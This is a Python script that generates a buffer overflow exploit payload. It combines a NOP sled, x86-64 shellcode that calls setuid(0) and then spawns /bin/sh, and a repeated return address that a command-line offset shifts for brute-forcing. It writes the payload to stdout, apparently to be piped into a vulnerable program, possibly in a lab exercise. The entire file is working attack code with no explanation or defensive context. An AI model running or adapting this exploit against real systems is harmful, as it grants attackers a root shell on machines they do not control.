import sys
import os

offset = int(sys.argv[1])

NOPSLED = bytes.fromhex('90')
NOPSLED = NOPSLED * 0x53

SHELLCODE = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"


RETURNADDRESS = b"bffdf000"
RETURNADDRESS = int(RETURNADDRESS, 16) + 0x20 * offset
RETURNADDRESS = RETURNADDRESS.to_bytes(4, 'little')
RETURNADDRESSBLOCK = RETURNADDRESS * 0x100

with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
    stdout.write(NOPSLED + SHELLCODE + RETURNADDRESSBLOCK + B'\n')

with os.fdopen(sys.stderr.fileno(), "w", closefd=False) as stderr:
    stderr.write(RETURNADDRESS.hex() + "\n")